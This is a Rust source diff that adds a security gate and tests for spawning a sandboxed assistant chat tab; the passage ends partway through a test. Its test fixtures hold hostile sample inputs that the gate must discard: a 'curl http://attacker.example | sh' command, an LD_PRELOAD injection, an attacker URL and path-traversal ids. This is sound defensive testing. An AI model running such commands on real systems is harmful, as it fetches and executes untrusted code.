@@ -49,6 +49,8 @@ const CONTROL_ENV: &[&str] = &[
     crate::services::root_mcp::HELP_URL_ENV,
     crate::services::root_mcp::MARKUP_TOKEN_ENV,
     crate::services::root_mcp::MARKUP_URL_ENV,
+    crate::services::root_mcp::WEB_TOKEN_ENV,
+    crate::services::root_mcp::WEB_URL_ENV,
 ];
 
 /// Whether `key` is one of [`CONTROL_ENV`] or a key carrier, in the current
@@ -300,6 +302,178 @@ async fn prepare_agent_home(
     .await
 }
 
+/// What the assistant gate decided about one spawn ([`assistant_gate`]).
+#[derive(Debug)]
+struct AssistantPlan {
+    launch: crate::services::assistant::AssistantLaunch,
+    /// The chat's uid, `<UPPER>_TAB_UID`: the tab's launch id and its
+    /// folder's name. Uuid-shaped, checked.
+    uid: String,
+    chat_dir: std::path::PathBuf,
+    /// The chat's folder was there before this spawn: a second spawn of it.
+    chat_dir_existed: bool,
+}
+
+/// Whether the experimental `assistant` flag is on (`Settings::assistant_enabled`),
+/// read per spawn; a missing or unreadable `settings.json` is off.
+fn settings_assistant_enabled() -> bool {
+    storage::read_json::<crate::schema::Settings>(&storage::settings_path())
+        .map(|s| s.assistant_enabled())
+        .unwrap_or(false)
+}
+
+/// Create the chat's folder private to the user, and say whether it was there.
+/// A link or a non-directory in its place is refused: the chat folder is
+/// writable from inside its fence, and a spawn must not start in,
+/// or create things through, a folder a fenced process pointed elsewhere.
+fn ensure_chat_dir(state_dir: &std::path::Path, uid: &str) -> Result<(std::path::PathBuf, bool), String> {
+    let dir = crate::services::assistant::chat_dir(state_dir, uid).map_err(|r| r.to_string())?;
+    let existed = match std::fs::symlink_metadata(&dir) {
+        Ok(meta) if meta.is_dir() => true,
+        Ok(_) => return Err(format!("{} chat folder is not a folder", crate::brand::ASSISTANT_NAME)),
+        Err(e) if e.kind() == std::io::ErrorKind::NotFound => false,
+        Err(e) => return Err(format!("{} chat folder: {e}", crate::brand::ASSISTANT_NAME)),
+    };
+    if !existed {
+        crate::services::agent_home::create_private_dir(&dir)
+            .map_err(|e| format!("create {} chat folder: {e}", crate::brand::ASSISTANT_NAME))?;
+    }
+    Ok((dir, existed))
+}
+
+/// The assistant scope's gate, run right after the control variables are
+/// stripped (plan "Call sites", rows 1-3). `Ok(None)` for every spawn that is
+/// not an assistant chat; for a chat, the options are rewritten to what a
+/// chat is and nothing else, whatever the caller sent:
+///
+/// - the scope id and the launch go together: `project_id == "assistant"`
+///   needs `PtyOptions.assistant`, and `assistant` needs that exact id (so a
+///   plain shell in the scope is refused too, and a reserved id in another
+///   spelling never reaches the registry lookups below);
+/// - it is refused while the experimental flag is off, for a launch
+///   [`validate_launch`](crate::services::assistant::validate_launch) refuses,
+///   for a `TAB_UID` that is not uuid-shaped, and for anything that would make
+///   the chat remote, a login, the Host session or an attach;
+/// - `cwd` is the chat's folder, built by the backend (`chat_dir`, created
+///   private); `env` is the tab's uid and nothing else; `cmd` and `args` are
+///   placeholders until [`assemble_assistant_launch`]; `sandbox` and
+///   `local_only` are forced, `agent` is set and `local_model` follows the
+///   profile; the schedule binding and host-bound marker are cleared.
+fn assistant_gate(opts: &mut PtyOptions, state_dir: &std::path::Path, enabled: bool) -> Result<Option<AssistantPlan>, String> {
+    let name = crate::brand::ASSISTANT_NAME;
+    let scope = opts.project_id.as_deref();
+    let reserved = scope.is_some_and(storage::is_reserved_scope);
+    let in_scope = scope == Some(storage::ASSISTANT_SCOPE);
+    if reserved && !in_scope {
+        return Err(format!("terminal: refusing to spawn tab '{}': the scope id is reserved", opts.id));
+    }
+    let Some(launch) = opts.assistant.clone() else {
+        if in_scope {
+            return Err(format!("terminal: refusing to spawn tab '{}': a {name} tab needs its launch", opts.id));
+        }
+        return Ok(None);
+    };
+    if !in_scope {
+        return Err(format!("terminal: refusing to spawn tab '{}': a {name} launch belongs to the {name} scope only", opts.id));
+    }
+    if !enabled {
+        return Err(format!("{name} is switched off in Settings \u{2192} Experimental"));
+    }
+    crate::services::assistant::validate_launch(&launch).map_err(|r| r.to_string())?;
+    let uid = opts
+        .env
+        .get(crate::app_env!("TAB_UID"))
+        .filter(|uid| crate::services::agent_session::is_uuid_shaped(uid))
+        .cloned()
+        .ok_or_else(|| crate::services::assistant::Refusal::BadUid.to_string())?;
+    if opts.host_session || opts.remote_host_id.is_some() || opts.login.is_some() || opts.tmux_attach.is_some() {
+        return Err(format!("terminal: refusing to spawn tab '{}': not a plain local {name} chat", opts.id));
+    }
+    let (chat_dir, chat_dir_existed) = ensure_chat_dir(state_dir, &uid)?;
+    opts.cwd = chat_dir.to_string_lossy().into_owned();
+    opts.env = std::collections::HashMap::from([(crate::app_env!("TAB_UID").to_string(), uid.clone())]);
+    opts.cmd = launch.cli.bin().to_string();
+    opts.args = Vec::new();
+    opts.sandbox = false;
+    opts.local_only = true;
+    opts.agent = true;
+    opts.local_model = launch.cli.is_local();
+    opts.schedule_target_id = None;
+    opts.host_bound_uid = None;
+    // The caller's tmux name is never used: `new-session -A -s <name>` attaches
+    // to ANY existing session of that name (a shell tab's, say). A chat that
+    // persists gets the name its uid derives; one that doesn't stays unwrapped.
+    if opts.tmux_session.is_some() {
+        opts.tmux_session = Some(crate::services::assistant::tmux_session_for(&uid));
+    }
+    Ok(Some(AssistantPlan { launch, uid, chat_dir, chat_dir_existed }))
+}
+
+/// Build the chat's `cmd`, `args` and `env` from its launch
+/// ([`assistant::launch_line`](crate::services::assistant::launch_line)),
+/// after `grant_lanes` put the web and help lanes' variables in `opts.env`, and resolve
+/// the session the way every agent tab does. `home` is the prepared assistant
+/// home; `provider` the local OpenCode provider config.
+///
+/// The resolver replaces a Codex tab's whole argv with `resume <id>` when it
+/// has a session to resume, so Codex resolves with an empty argv and the pinned
+/// arguments go in front of whatever it answers (a global `-c` before the
+/// subcommand, as the MCP lanes' do). Claude's `--session-id` becomes
+/// `--resume` in place.
+fn assemble_assistant_launch(
+    opts: &mut PtyOptions,
+    plan: &AssistantPlan,
+    home: &std::path::Path,
+    provider: Option<&str>,
+) -> Result<Option<crate::services::codex_bind::ResumeClaim>, String> {
+    assemble_assistant_launch_with(opts, plan, home, provider, &crate::services::agent_session::resolve_agent_session)
+}
+
+/// [`assemble_assistant_launch`] with the session resolver given, so a test
+/// can say what a resumable session looks like.
+fn assemble_assistant_launch_with(
+    opts: &mut PtyOptions,
+    plan: &AssistantPlan,
+    home: &std::path::Path,
+    provider: Option<&str>,
+    resolve: &dyn Fn(PtyOptions) -> PtyOptions,
+) -> Result<Option<crate::services::codex_bind::ResumeClaim>, String> {
+    use crate::services::assistant::{help_url_from_env, launch_line, AssistantCli, LaneGrant, LaunchCtx};
+    let lane = LaneGrant::from_env(&opts.env);
+    let help = help_url_from_env(&opts.env);
+    // The home as the process sees it: the fence binds the agent home at the
+    // user's home path on Linux; elsewhere `HOME` points at the home itself.
+    let visible_home = if cfg!(target_os = "linux") { crate::paths::home_dir() } else { home.to_path_buf() };
+    let ctx = LaunchCtx {
+        tab_uid: &plan.uid,
+        chat_dir_existed: plan.chat_dir_existed,
+        home,
+        lane: lane.as_ref(),
+        help: help.as_deref(),
+        visible_home: &visible_home,
+        opencode_provider: provider,
+    };
+    let spawn = launch_line(&plan.launch, &ctx).map_err(|r| r.to_string())?;
+    opts.cmd = spawn.cmd;
+    opts.env.extend(spawn.env);
+    let pinned = spawn.args;
+    let mut claim = None;
+    match plan.launch.cli {
+        AssistantCli::Codex => {
+            opts.args = Vec::new();
+            *opts = resolve(opts.clone());
+            claim = crate::services::codex_bind::reserve_resume(opts);
+            let resumed = std::mem::take(&mut opts.args);
+            opts.args = pinned.into_iter().chain(resumed).collect();
+        }
+        _ => {
+            opts.args = pinned;
+            *opts = resolve(opts.clone());
+        }
+    }
+    Ok(claim)
+}
+
 fn cwd_within(cwd: &str, allowed: &std::path::Path) -> bool {
     std::path::Path::new(cwd).starts_with(allowed)
 }
@@ -485,8 +659,9 @@ pub async fn prepare(
     session_name: Option<String>,
     pool: Option<&crate::services::remote::RemotePoolState>,
 ) -> Result<PreparedLaunch, String> {
-    // Resolve empty cwd to Tabtivity's root workspace directory.
-    if opts.cwd.is_empty() {
+    // Resolve empty cwd to Tabtivity's root workspace directory (an assistant
+    // chat's cwd is its own folder, set by the gate below).
+    if opts.cwd.is_empty() && opts.assistant.is_none() {
         let root_dir = storage::root_work_dir();
         std::fs::create_dir_all(&root_dir).map_err(|e| {
             format!(
@@ -510,6 +685,13 @@ pub async fn prepare(
         eprintln!("launch_prep: tab '{}' brought {}; dropped", opts.id, planted.join(", "));
     }
 
+    // The chat assistant's scope (plan "Call sites", rows 1-3): the options of
+    // a chat are rewritten to what the backend builds for it, whatever the
+    // caller sent, and every other spawn is checked not to be one in disguise.
+    let state_dir = storage::state_dir();
+    let assistant_plan = assistant_gate(&mut opts, &state_dir, settings_assistant_enabled())?;
+    let assistant = assistant_plan.is_some();
+
     // The renderer's two authority flags (`sandbox`, `local_only`) are re-derived
     // here from `projects.json` in the state dir — the one project record a
     // containerized agent cannot write, unlike the persisted tab layout the
@@ -517,7 +699,9 @@ pub async fn prepare(
     // this a planted layout entry declaring `location: "local"` skipped both the
     // docker wrap and the ssh wrap and ran its argv on the host. Runs first, so
     // every step below sees the enforced values.
-    crate::services::sandbox::enforce_spawn_authority(&mut opts);
+    if !assistant {
+        crate::services::sandbox::enforce_spawn_authority(&mut opts);
+    }
 
     // VM-tier hard refusals (`docs/vm_projects_plan.md`): for a VM project the
     // remote→local fallback that exists elsewhere is not a perf surprise but
@@ -526,7 +710,7 @@ pub async fn prepare(
     // sentinel (the frontend offers a boot action) rather than downgrading to
     // a host shell. Checked against the state-dir `projects.json` (the record
     // an in-VM agent cannot write), like the authority flags above.
-    if let Some(pid) = opts.project_id.as_deref() {
+    if let Some(pid) = opts.project_id.as_deref().filter(|_| !assistant) {
         let is_vm = crate::services::remote::remote_target_for(pid)
             .is_some_and(|t| crate::services::vm::is_vm_spec(&t.spec));
         if let Some(refusal) = vm_spawn_refusal(
@@ -543,7 +727,7 @@ pub async fn prepare(
     // project's local mirror — it can't reach the remote tree. Resolve the cwd to
     // the mirror here (authoritative, OS-correct path) and ensure it exists, so a
     // local agent/shell tab spawns in the synced twin rather than a stale cwd.
-    if opts.local_only {
+    if opts.local_only && !assistant {
         if let Some(pid) = opts.project_id.clone() {
             if crate::services::remote::remote_target_for(&pid).is_some() {
                 let mirror = crate::services::remote_sync::mirror_dir(&pid);
@@ -561,7 +745,9 @@ pub async fn prepare(
     // project's authority. Exempt only a truly-remote, non-`local_only` tab:
     // its `cwd` names a path on the far host, which this process has no way to
     // check (the ssh-wrapped command below does the `cd` on that side).
-    if let Some(pid) = opts.project_id.clone() {
+    // (An assistant chat's cwd is the chat's own folder, built and created by
+    // the gate; there is no project it could claim to belong to.)
+    if let Some(pid) = opts.project_id.clone().filter(|_| !assistant) {
         // Box scope (`box:<id>`): the tab may live in the box folder, any member
         // project's root, or a remote member's local mirror — the co-accessible
         // set the box exists to create. An unknown box fails closed, same
@@ -605,7 +791,7 @@ pub async fn prepare(
     // The tab's scope, for the agent shims a shell tab may run
     // (`services::agent_shim`): its project or box, else the root console.
     let scope = crate::services::agent_home::scope_of(opts.project_id.as_deref());
-    let project_dir = opts.project_id.as_deref().map(|pid| {
+    let project_dir = opts.project_id.as_deref().filter(|_| !assistant).map(|pid| {
         let box_folder = crate::commands::boxes::box_id_of_scope(pid).and_then(|id|
             crate::commands::boxes::get_boxes().ok()?.into_iter().find(|b| b.id == id)?.folder);
         let remote = crate::services::remote::remote_target_for(pid);
@@ -624,7 +810,10 @@ pub async fn prepare(
     // string built by `wrap_pty_options`. (For local tabs this is the same
     // resolution `spawn_pty` used to do; it no longer does, to avoid resolving
     // twice.)
-    opts = crate::services::agent_session::resolve_agent_session(opts);
+    // (A chat's session is resolved once its argv is built, below.)
+    if !assistant {
+        opts = crate::services::agent_session::resolve_agent_session(opts);
+    }
 
     // Resolve the fourth authority axis while cmd/cwd still describe the agent
     // itself.  A local project member gets its own root plus the union of every
@@ -636,13 +825,17 @@ pub async fn prepare(
             .project_id
             .as_deref()
             .is_some_and(|id| crate::services::remote::remote_target_for(id).is_some());
-    let resume_claim = if opts.cmd == "codex" && !remote_agent_run {
+    let mut resume_claim = if opts.cmd == "codex" && !remote_agent_run && !assistant {
         crate::services::codex_bind::reserve_resume(&mut opts)
     } else {
         None
     };
     let agent_spawn = crate::services::agent_fence::is_agent(&opts);
-    let fence_roots = if agent_spawn && !remote_agent_run {
+    let fence_roots = if assistant {
+        // A chat has no project, box or root folder: the fence binds only its
+        // home and its work folder (a support mount, `agent_fence`).
+        Some(Vec::new())
+    } else if agent_spawn && !remote_agent_run {
         Some(
             crate::services::agent_fence::roots_for_scope(
                 opts.project_id.as_deref(),
@@ -711,7 +904,10 @@ pub async fn prepare(
     // inline config, never written into OpenCode's own. A remote run's OpenCode
     // talks to the far host's Ollama, and an inline config the user set wins.
     const OPENCODE_INLINE: &str = "OPENCODE_CONFIG_CONTENT";
+    // (A chat's profile builds its own config, tools off, and the user's
+    // environment's never wins: `assistant::launch_line` sets it.)
     if !remote_agent_run
+        && !assistant
         && !opts.env.contains_key(OPENCODE_INLINE)
         && std::env::var_os(OPENCODE_INLINE).is_none()
     {
@@ -722,6 +918,26 @@ pub async fn prepare(
                 opts.env.insert(OPENCODE_INLINE.into(), cfg);
             }
         }
+    }
+
+    // A chat's launch: its home first (Codex's catalog is written into it),
+    // then the argv and env the profile pins, with the lane `grant_lanes` just
+    // granted. The home is kept for the fence arm below.
+    let mut assistant_home = None;
+    if let Some(plan) = &assistant_plan {
+        let (chat_dir, local) = (plan.chat_dir.clone(), plan.launch.cli.is_local());
+        let home = home_off_thread("Assistant home", move || {
+            crate::services::agent_home::prepare_assistant_home(local, &chat_dir)
+        })
+        .await?;
+        let provider = match (plan.launch.cli, plan.launch.model.as_deref()) {
+            (crate::services::assistant::AssistantCli::OpenCodeLocal, Some(model)) => {
+                Some(crate::commands::ollama::opencode_assistant_provider(model))
+            }
+            _ => None,
+        };
+        resume_claim = assemble_assistant_launch(&mut opts, plan, &home.dir, provider.as_deref())?;
+        assistant_home = Some(home);
     }
 
     // The agent's hooks report its turn state under its tab uid; bind that uid
@@ -794,6 +1010,7 @@ pub async fn prepare(
     // notice instead.
     if opts.cmd == "claude"
         && !root_agent
+        && !assistant
         && !crate::services::agent_fence::runs_subcommand(&opts.args)
         && resolve_agent_remote_control(opts.project_id.as_deref())
         && !opts.args.iter().any(|a| a == "--remote-control")
@@ -953,7 +1170,10 @@ pub async fn prepare(
                 // agent's `$HOME` from here on: bound by the Linux fence, set
                 // by environment where the fence cannot redirect a path. A
                 // local-model tab gets the scope's local-model home instead.
-                let home = prepare_agent_home(&scope_id, roots, opts.local_model).await?;
+                let home = match assistant_home.take() {
+                    Some(home) => home,
+                    None => prepare_agent_home(&scope_id, roots, opts.local_model).await?,
+                };
                 #[cfg(target_os = "linux")]
                 crate::services::agent_fence::wrap_pty_options_bwrap(
                     &mut opts, roots, &scope_id, &home.dir,
@@ -991,7 +1211,10 @@ pub async fn prepare(
             crate::services::agent_fence::FenceDecision::NotApplicable { reason: "platform" }
                 if local_agent =>
             {
-                let home = prepare_agent_home(&scope_id, roots, opts.local_model).await?;
+                let home = match assistant_home.take() {
+                    Some(home) => home,
+                    None => prepare_agent_home(&scope_id, roots, opts.local_model).await?,
+                };
                 for (k, v) in crate::services::agent_fence::home_env(&home.dir, &crate::paths::home_dir()) {
                     opts.env.entry(k).or_insert(v);
                 }
@@ -1007,6 +1230,12 @@ pub async fn prepare(
                 return Err(crate::services::agent_fence::fence_unavailable_message());
             }
             _ => {}
+        }
+        // A chat runs only in the two arms above, each of which takes its home:
+        // any other decision (an unforeseen `NotApplicable`) leaves it unused,
+        // and the chat is refused rather than run unfenced.
+        if assistant_home.is_some() {
+            return Err(format!("{} chat was not started: no agent fence applies to it", crate::brand::ASSISTANT_NAME));
         }
         // The Pusher binding records where its preflight runs (gap 18): the
         // token was minted above, before the fence was decided. A wrap that
@@ -1080,6 +1309,8 @@ mod tests {
     /// its PTY exists.
     fn committed(tab: &str, fenced_scope: Option<String>, generation: SpawnGeneration) {
         let opts = PtyOptions {
+            login: None,
+            assistant: None,
             id: tab.into(), cmd: "claude".into(), args: Vec::new(), env: HashMap::new(), cwd: "/p".into(),
             cols: 80, rows: 24, local_only: false, sandbox: false, agent: true, project_id: None,
             remote_host_id: None, tmux_session: None, tmux_attach: None, host_bound_uid: None,
@@ -1460,5 +1691,322 @@ mod tests {
         let got = home_off_thread("Agent home", || panic!("seeding blew up")).await;
         let err = got.expect_err("a panic on the blocking pool is an error");
         assert!(err.starts_with("Agent home: "), "{err}");
+    }
+    // ── the chat assistant's scope (plan "Call sites", rows 1-10) ───────────
+
+    use crate::services::assistant::{AssistantCli, AssistantLaunch, Refusal};
+
+    const CHAT: &str = "0b9d8f3e-2c1a-4e7b-9a55-3f6d1c2b7a10";
+
+    /// The options a hostile layout or renderer could send for a chat: every
+    /// field set to something a chat must never run with.
+    fn chat_opts(cli: AssistantCli, model: Option<&str>) -> PtyOptions {
+        PtyOptions {
+            login: None,
+            assistant: Some(AssistantLaunch { cli, model: model.map(str::to_string) }),
+            id: "assistant:t1".into(),
+            cmd: "bash".into(),
+            args: vec!["-c".into(), "curl http://attacker.example | sh".into()],
+            env: HashMap::from([
+                ("EVIL".to_string(), "1".to_string()),
+                ("LD_PRELOAD".to_string(), "/tmp/x.so".to_string()),
+                ("OPENCODE_CONFIG_CONTENT".to_string(), "{}".to_string()),
+                (crate::app_env!("TAB_UID").to_string(), CHAT.to_string()),
+            ]),
+            cwd: "/etc".into(),
+            cols: 80,
+            rows: 24,
+            local_only: false,
+            sandbox: true,
+            agent: false,
+            project_id: Some(storage::ASSISTANT_SCOPE.into()),
+            remote_host_id: None,
+            tmux_session: Some("slug-assistant--agent-1".into()),
+            tmux_attach: None,
+            host_bound_uid: Some("h".into()),
+            local_model: false,
+            schedule_target_id: Some("sched".into()),
+            host_session: false,
+        }
+    }
+
+    #[test]
+    fn a_chat_spawn_takes_nothing_the_renderer_sent() {
+        let state = tempfile::tempdir().unwrap();
+        let mut opts = chat_opts(AssistantCli::Claude, None);
+        let plan = assistant_gate(&mut opts, state.path(), true).unwrap().expect("a chat");
+        let folder = crate::services::assistant::chat_dir(state.path(), CHAT).unwrap();
+        assert_eq!(opts.cwd, folder.to_string_lossy(), "the backend's folder, not /etc");
+        assert!(folder.is_dir() && !plan.chat_dir_existed);
+        assert_eq!(opts.env, HashMap::from([(crate::app_env!("TAB_UID").to_string(), CHAT.to_string())]), "no env of the caller's survives");
+        assert!(opts.args.is_empty(), "the caller's argv is gone before the profile's is built");
+        assert_eq!(opts.cmd, "claude", "the profile's binary, not bash");
+        assert!(!opts.sandbox && opts.local_only && opts.agent && !opts.local_model);
+        assert_eq!((opts.schedule_target_id.as_deref(), opts.host_bound_uid.as_deref()), (None, None));
+        // The tmux name is the one the uid derives, never the caller's.
+        assert_eq!(opts.tmux_session, Some(crate::services::assistant::tmux_session_for(CHAT)));
+        // A second spawn of the chat finds its folder.
+        let mut again = chat_opts(AssistantCli::Claude, None);
+        assert!(assistant_gate(&mut again, state.path(), true).unwrap().unwrap().chat_dir_existed);
+        // A local profile takes the local-model home.
+        let mut local = chat_opts(AssistantCli::OpenCodeLocal, Some("qwen3:8b"));
+        assistant_gate(&mut local, state.path(), true).unwrap().unwrap();
+        assert!(local.local_model && local.cmd == "opencode");
+        #[cfg(unix)]
+        {
+            use std::os::unix::fs::PermissionsExt;
+            assert_eq!(std::fs::metadata(&folder).unwrap().permissions().mode() & 0o077, 0, "private to the user");
+        }
+    }
+
+    /// `new-session -A -s <name>` attaches to ANY existing session of that name,
+    /// a shell tab's or one the user attached by hand. A chat is never given a
+    /// name a caller chose: the gate sets it from the uid, and the tmux argv
+    /// that comes out carries only that.
+    #[test]
+    fn a_caller_supplied_tmux_session_never_reaches_tmux() {
+        let state = tempfile::tempdir().unwrap();
+        for hostile in ["other-p1--shell-aaaa", "user-session", "x:y", "", "-t"] {
+            let mut opts = chat_opts(AssistantCli::Claude, None);
+            opts.tmux_session = Some(hostile.to_string());
+            assistant_gate(&mut opts, state.path(), true).unwrap().expect("a chat");
+            assert_eq!(opts.tmux_session, Some(crate::services::assistant::tmux_session_for(CHAT)), "{hostile:?}");
+            let argv = crate::services::tmux_local::local_tmux_argv(opts.tmux_session.as_deref().unwrap(), &opts, false);
+            let at = argv.iter().position(|a| a == "-s").expect("new-session -s");
+            assert_eq!(argv[at + 1], crate::services::assistant::tmux_session_for(CHAT));
+            if !hostile.is_empty() {
+                assert!(!argv.iter().any(|a| a.contains(hostile) && a != "-t"), "{hostile:?} in {argv:?}");
+            }
+        }
+        // A chat the window did not wrap in tmux stays unwrapped.
+        let mut plain = chat_opts(AssistantCli::Claude, None);
+        plain.tmux_session = None;
+        assistant_gate(&mut plain, state.path(), true).unwrap().unwrap();
+        assert_eq!(plain.tmux_session, None);
+    }
+
+    #[test]
+    fn the_assistant_scope_refuses_what_is_not_a_plain_local_chat() {
+        let state = tempfile::tempdir().unwrap();
+        let gate = |mut opts: PtyOptions, enabled: bool| assistant_gate(&mut opts, state.path(), enabled);
+        let base = || chat_opts(AssistantCli::Claude, None);
+        // The experimental flag.
+        assert!(gate(base(), false).unwrap_err().contains("switched off"));
+        // A plain shell in the scope (which `decide` would leave unfenced, a
+        // shell not being an agent), and an agent with no launch.
+        for cmd in ["", "bash", "claude"] {
+            let mut shell = base();
+            shell.assistant = None;
+            shell.cmd = cmd.into();
+            shell.agent = cmd == "claude";
+            assert!(gate(shell, true).unwrap_err().contains("needs its launch"), "{cmd:?}");
+        }
+        // The launch belongs to the scope, and the scope to the launch.
+        for scope in [None, Some("p1"), Some("root"), Some("box:b1")] {
+            let mut other = base();
+            other.project_id = scope.map(str::to_string);
+            assert!(gate(other, true).is_err(), "{scope:?}");
+        }
+        // A reserved id in another spelling is no way round.
+        for scope in ["Assistant", "assistant ", "ASSISTANT", " assistant", "root", "Root"] {
+            let mut other = base();
+            other.assistant = None;
+            other.project_id = Some(scope.into());
+            assert!(gate(other, true).unwrap_err().contains("reserved"), "{scope:?}");
+        }
+        // Not a uuid-shaped uid: it would become a path component.
+        for uid in ["", "..", "../x", "root", "a/b", "0b9d8f3e-2c1a-4e7b-9a55-3f6d1c2b7a1"] {
+            let mut opts = base();
+            opts.env.insert(crate::app_env!("TAB_UID").into(), uid.into());
+            assert_eq!(gate(opts, true).unwrap_err(), Refusal::BadUid.to_string(), "{uid:?}");
+        }
+        let mut no_uid = base();
+        no_uid.env.clear();
+        assert_eq!(gate(no_uid, true).unwrap_err(), Refusal::BadUid.to_string());
+        // Nothing that makes the chat remote, a login, the Host session or an attach.
+        let mut host = base();
+        host.host_session = true;
+        let mut remote = base();
+        remote.remote_host_id = Some("gpu".into());
+        let mut attach = base();
+        attach.tmux_attach = Some("s".into());
+        for opts in [host, remote, attach] {
+            assert!(gate(opts, true).unwrap_err().contains("not a plain local"));
+        }
+        // A model that reads as a flag, a local chat with no model.
+        assert!(gate(chat_opts(AssistantCli::Claude, Some("--dangerously-skip-permissions")), true).is_err());
+        assert!(gate(chat_opts(AssistantCli::OpenCodeLocal, None), true).is_err());
+        // An ordinary spawn is none of the gate's business.
+        let mut project = base();
+        project.assistant = None;
+        project.project_id = Some("p1".into());
+        let untouched = project.clone();
+        assert!(assistant_gate(&mut project, state.path(), false).unwrap().is_none());
+        assert_eq!((project.cmd, project.cwd, project.args), (untouched.cmd, untouched.cwd, untouched.args));
+        // Nothing was created for any refusal above but the one chat folder's parent.
+        assert!(!crate::services::assistant::chat_dir(state.path(), CHAT).unwrap().exists());
+    }
+
+    #[test]
+    fn an_unknown_cli_cannot_even_be_parsed_into_a_spawn() {
+        let json = |cli: &str| {
+            serde_json::json!({
+                "id": "a", "cmd": "bash", "args": [], "env": {}, "cwd": "/", "cols": 80, "rows": 24,
+                "assistant": { "cli": cli }
+            })
+        };
+        assert!(serde_json::from_value::<PtyOptions>(json("claude")).is_ok());
+        for cli in ["gemini", "bash", "Claude", ""] {
+            assert!(serde_json::from_value::<PtyOptions>(json(cli)).is_err(), "{cli:?}");
+        }
+        let mut extra = json("claude");
+        extra["assistant"]["args"] = serde_json::json!(["--x"]);
+        assert!(serde_json::from_value::<PtyOptions>(extra).is_err(), "no field beyond cli and model");
+    }
+
+    #[test]
+    fn a_chat_folder_that_is_a_link_is_refused() {
+        let state = tempfile::tempdir().unwrap();
+        let (dir, existed) = ensure_chat_dir(state.path(), CHAT).unwrap();
+        assert!(!existed && dir.is_dir());
+        assert!(ensure_chat_dir(state.path(), CHAT).unwrap().1);
+        #[cfg(unix)]
+        {
+            let elsewhere = tempfile::tempdir().unwrap();
+            std::fs::remove_dir(&dir).unwrap();
+            std::os::unix::fs::symlink(elsewhere.path(), &dir).unwrap();
+            assert!(ensure_chat_dir(state.path(), CHAT).is_err());
+        }
+        let file_state = tempfile::tempdir().unwrap();
+        let file_dir = crate::services::assistant::chat_dir(file_state.path(), CHAT).unwrap();
+        std::fs::create_dir_all(file_dir.parent().unwrap()).unwrap();
+        std::fs::write(&file_dir, "x").unwrap();
+        assert!(ensure_chat_dir(file_state.path(), CHAT).is_err());
+    }
+
+    /// Row 5: whatever the caller sent, an assistant spawn gets the web and
+    /// help lanes or nothing — never the root, schedule, push or markup lane.
+    #[test]
+    fn a_chat_is_granted_no_lane_but_the_web_and_help_ones() {
+        use crate::services::root_mcp::{self, Runtime, HELP_TOKEN_ENV, HELP_URL_ENV, WEB_TOKEN_ENV, WEB_URL_ENV};
+        let state = tempfile::tempdir().unwrap();
+        // Everything on, and a project record that borrows the scope's id.
+        std::fs::write(
+            state.path().join("settings.json"),
+            r#"{"assistant":true,"help_mcp":true,"markup_mcp":true,"root_mcp":true,"git_push_mcp":true}"#,
+        )
+        .unwrap();
+        std::fs::write(
+            state.path().join("projects.json"),
+            serde_json::to_vec(&serde_json::json!([{
+                "id": "assistant", "name": "Borrowed", "status": "active", "position": 0,
+                "local_file": "/p/project.json", "directory": "/home/u/secret"
+            }]))
+            .unwrap(),
+        )
+        .unwrap();
+        let everything = Runtime { port: 1, serves_root: true, serves_markup: true, serves_web: true };
+        for runtime in [Some(&everything), None] {
+            for sandbox in [false, true] {
+                let mut opts = chat_opts(AssistantCli::OpenCodeLocal, Some("m"));
+                opts.sandbox = sandbox;
+                let root_agent = root_mcp::grant_lanes(&mut opts, true, runtime, &root_mcp::TokenStore::default(), state.path());
+                assert!(!root_agent);
+                let granted: Vec<&String> =
+                    opts.env.keys().filter(|k| k.ends_with("_MCP_TOKEN") || k.ends_with("_MCP_URL")).collect();
+                assert!(
+                    granted.iter().all(|k| [WEB_TOKEN_ENV, WEB_URL_ENV, HELP_TOKEN_ENV, HELP_URL_ENV].contains(&k.as_str())),
+                    "lanes granted: {granted:?}"
+                );
+                assert_eq!(granted.len(), if runtime.is_some() { 4 } else { 0 }, "lanes granted: {granted:?}");
+                // The schedule binding the caller sent rides along unused: the
+                // gate clears it, and no schedule token exists to bind it to.
+                assert!(!opts.env.contains_key(root_mcp::SCHEDULE_TOKEN_ENV) && !opts.env.contains_key(root_mcp::MARKUP_TOKEN_ENV));
+            }
+        }
+    }
+
+    /// Row 9: the web lane's variables are control variables, and a failed
+    /// spawn revokes its token.
+    #[test]
+    fn the_web_lane_is_a_control_variable_and_a_failed_spawn_revokes_it() {
+        use crate::services::root_mcp::{self, Caller, WEB_TOKEN_ENV, WEB_URL_ENV};
+        assert!(is_control_env(WEB_TOKEN_ENV) && is_control_env(WEB_URL_ENV));
+        let mut planted: HashMap<String, String> =
+            HashMap::from([(WEB_TOKEN_ENV.to_string(), "planted".to_string()), (WEB_URL_ENV.to_string(), "http://attacker.example".to_string())]);
+        assert_eq!(strip_control_env(&mut planted).len(), 2);
+        assert!(planted.is_empty());
+
+        let (token, _) = root_mcp::test_session_for_tab(Caller::Web, "assistant:guard", Path::new("/nonexistent"));
+        let mut opts = chat_opts(AssistantCli::Claude, None);
+        opts.env.insert(WEB_TOKEN_ENV.to_string(), token.clone());
+        let guard = root_mcp::SpawnTokenGuard::new(&opts);
+        assert!(root_mcp::authenticate(Some(&format!("Bearer {token}"))).is_some());
+        drop(guard);
+        assert!(root_mcp::authenticate(Some(&format!("Bearer {token}"))).is_none(), "the web token is revoked with a spawn that never started");
+    }
+
+    #[test]
+    fn the_profile_builds_the_argv_after_the_lane_and_the_resumed_session() {
+        let state = tempfile::tempdir().unwrap();
+        let home = tempfile::tempdir().unwrap();
+        let identity = |opts: PtyOptions| opts;
+        let lane_url = "http://127.0.0.1:43111/mcp/web";
+        let plan = |opts: &mut PtyOptions| assistant_gate(opts, state.path(), true).unwrap().unwrap();
+
+        // Claude: the lane the grant put in the env is wired by name, the
+        // session id leads, and the caller's argv is nowhere.
+        let mut claude = chat_opts(AssistantCli::Claude, None);
+        let claude_plan = plan(&mut claude);
+        claude.env.insert(crate::services::root_mcp::WEB_URL_ENV.into(), lane_url.into());
+        claude.env.insert(crate::services::root_mcp::WEB_TOKEN_ENV.into(), "web-token-0123".into());
+        assemble_assistant_launch_with(&mut claude, &claude_plan, home.path(), None, &identity).unwrap();
+        assert_eq!(claude.cmd, "claude");
+        assert_eq!(claude.args[..2], ["--session-id".to_string(), CHAT.to_string()]);
+        assert!(claude.args.iter().any(|a| a.contains(lane_url)));
+        assert!(claude.args.iter().all(|a| !a.contains("web-token-0123") && !a.contains("attacker")));
+        assert_eq!(claude.env.get("EVIL"), None);
+
+        // Codex: a resumable session replaces the argv the resolver sees, and
+        // the pinned arguments go in front of its `resume <id>`.
